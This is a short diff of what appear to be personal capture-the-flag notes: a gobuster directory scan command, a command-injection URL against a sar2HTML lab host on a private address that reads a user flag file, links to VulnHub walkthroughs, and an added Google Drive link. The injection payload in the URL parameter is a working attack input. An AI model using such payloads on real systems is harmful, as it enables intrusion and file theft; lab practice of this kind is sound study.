@@ -14,3 +14,4 @@ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt-u h
 192.168.79.131/sar2HTML/index.php?plot=; cat /home/love/Desktop/user.txt
 https://russellmurad.medium.com/hacking-messaih-1-vulnhub-walkthrough-601147727dcc
 https://resources.infosecinstitute.com/topics/capture-the-flag/victim-1-vulnhub-ctf-walkthrough/
+https://drive.google.com/file/d/1Ds6vnRHAIvX3xSbM9M_1v1jjWekJgnRK/view?usp=drivesdk
